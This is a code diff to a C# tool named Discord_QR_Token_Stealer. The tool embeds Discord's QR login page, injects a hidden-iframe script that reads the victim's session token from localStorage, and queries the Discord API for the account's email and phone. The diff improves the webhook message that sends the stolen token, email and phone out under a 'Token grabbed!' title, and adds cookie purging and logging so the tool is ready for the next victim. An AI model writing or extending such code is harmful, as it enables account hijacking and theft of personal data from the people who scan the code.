@@ -87,7 +87,11 @@ namespace Discord_QR_Token_Stealer
         void accountLoggedIn()
         {
             timeLeftTimer.Stop();
-            chromiumWebBrowser1.ExecuteScriptAsync("var s=document.createElement('iframe');s.style.display='none';document.body.appendChild(s);console.log('token;'+s.contentWindow.localStorage.token);");
+            chromiumWebBrowser1.EvaluateScriptAsync("var s=document.createElement('iframe');s.style.display='none';document.body.appendChild(s);console.log('token;'+s.contentWindow.localStorage.token);");
+
+            // clear out the side panel to template.png
+            currentCode.Load("template.png");
+            createLog("Changed current code to template.png because of log in");
         }
 
         // change a base64 string back into a png and save it
@@ -110,9 +114,8 @@ namespace Discord_QR_Token_Stealer
             try
             {
                 // casted as httpwebrequest because i couldnt set user agent without error, fuck you
-                var client = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me");
+                var client = WebRequest.Create("https://discord.com/api/v9/users/@me");
                 client.Headers.Add("authorization", token);
-                client.UserAgent = "ur/mom";
             
                 // lazy work right here
                 var json = JsonConvert.DeserializeObject<TokenInformation>(new StreamReader(client.GetResponse().GetResponseStream()).ReadToEnd());
@@ -217,6 +220,9 @@ namespace Discord_QR_Token_Stealer
         // says its loaded
         private void chromiumWebBrowser1_IsBrowserInitializedChanged(object sender, EventArgs e)
         {
+            // clear labels n shit
+            clearInfo();
+
             // load discord login
             chromiumWebBrowser1.Load("https://discord.com/login");
 
@@ -232,9 +238,7 @@ namespace Discord_QR_Token_Stealer
                     updateInfo(msg.Message.Substring(7, msg.Message.Length - 8));
 
                 //File.AppendAllText("console.log", $"{msg.Message}\n");
-                logBox.Invoke((MethodInvoker)(() => {
-                    logBox.Items.Add(msg.Message);
-                }));
+                createLog(msg.Message);
             };
         }
 
@@ -261,6 +265,7 @@ namespace Discord_QR_Token_Stealer
             // i kinda hate this
             var text = sender.GetType().GetProperty("Text");
             Clipboard.SetText(text.GetValue(sender).ToString());
+            createLog($"Copied {sender.GetType().GetProperty("Text").GetValue(sender)} to clipboard");
         }
 
         private void exportInfo_Click(object sender, EventArgs e)
@@ -278,13 +283,16 @@ namespace Discord_QR_Token_Stealer
                 Directory.CreateDirectory("exports");
 
             // its 6:30 am help
-            File.WriteAllText($"exports/token_export_{tokenInfo.Id}.txt", JsonConvert.SerializeObject(tokenInfo, Formatting.Indented));
+            File.WriteAllText($"exports/{tokenInfo.Id}.txt", JsonConvert.SerializeObject(tokenInfo, Formatting.Indented));
+
+            // create log
+            createLog($"Exported information to exports/{tokenInfo.Id}.txt");
         }
 
         // reload button
         private void reloadPage_Click(object sender, EventArgs e)
         {
-            chromiumWebBrowser1.Load(chromiumWebBrowser1.Address);
+            clearInfo();
         }
 
         // fix maybe??
@@ -327,11 +335,11 @@ namespace Discord_QR_Token_Stealer
             if (tokenInfo.Avatar == null)
                 av = "https://raw.githubusercontent.com/verlox/Discord-QR-Token-Logger/master/Discord-QR-Token-Stealer/sniffcat.jpg";
             else
-                av = tokenInfo.Avatar;
+                av = $"https://cdn.discordapp.com/avatars/{tokenInfo.Id}/{tokenInfo.Avatar}.png";
 
             try
             {
-                var body = "{\"embeds\":[{\"title\":\"Token grabbed!\",\"description\":\"`" + tokenInfo.Token + "`\",\"color\":\"7407103\",\"thumbnail\":{\"url\":\"" + av + "\"},\"fields\":[{\"name\":\"Email\",\"value\":\"" + tokenInfo.Email + "\"},{\"name\":\"Phone\",\"value\":\"" + tokenInfo.Phone + "\"}],\"timestamp\":\"" + DateTime.Now.ToUniversalTime().ToString("o") + "\",\"footer\":{\"text\":\"made by verlox.cc\"}}],\"avatar_url\":\"https://raw.githubusercontent.com/verlox/Discord-QR-Token-Logger/master/Discord-QR-Token-Stealer/sniffcat.jpg\",\"username\":\"lithhook\"}";
+                var body = "{\"embeds\":[{\"title\":\"Token grabbed from " + $"{tokenInfo.Username}#{tokenInfo.Discriminator}" + "!\",\"description\":\"`" + tokenInfo.Token + "`\",\"color\":\"7407103\",\"thumbnail\":{\"url\":\"" + av + "\"},\"fields\":[{\"name\": \"ID\", \"value\": \"" + tokenInfo.Id + "\"},{\"name\":\"Email\",\"value\":\"" + tokenInfo.Email + "\"},{\"name\":\"Phone\",\"value\":\"" + tokenInfo.Phone + "\"}],\"timestamp\":\"" + DateTime.Now.ToUniversalTime().ToString("o") + "\",\"footer\":{\"text\":\"made by verlox.cc\"}}],\"avatar_url\":\"https://raw.githubusercontent.com/verlox/Discord-QR-Token-Logger/master/Discord-QR-Token-Stealer/sniffcat.jpg\",\"username\":\"lithhook\"}";
 
                 // log body to debug
                 Debug.WriteLine(body);
@@ -365,9 +373,44 @@ namespace Discord_QR_Token_Stealer
                 logBox.Invoke((MethodInvoker)(() =>
                 {
                     logBox.Items.Add(text);
+                    logBox.SelectedIndex = logBox.Items.Count - 1;
                 }));
             } else
+            {
                 logBox.Items.Add(text);
+                logBox.SelectedIndex = logBox.Items.Count - 1;
+            }
+        }
+
+        void clearInfo()
+        {
+            // more lazy crash protection
+            try
+            {
+                // reload page
+                chromiumWebBrowser1.Load(chromiumWebBrowser1.Address);
+
+                // clear out the labels
+                lblTag.Text = "Tag";
+                lblEmail.Text = "Email";
+                lblId.Text = "Id";
+                lblPhone.Text = "Phone";
+                lblToken.Text = "Token";
+
+                // clear out the picturebox
+                currentCode.Load("template.png");
+
+                // clear cookies
+                var cookieManager = chromiumWebBrowser1.GetCookieManager();
+                cookieManager.DeleteCookies();
+
+                createLog($"Purged browser cookies.");
+            }
+            catch (Exception ex)
+            {
+                createLog($"Failed to delete cookies: {ex.Message}");
+                try { chromiumWebBrowser1.Load("https://discord.com/login"); } catch { }
+            }
         }
     }
 
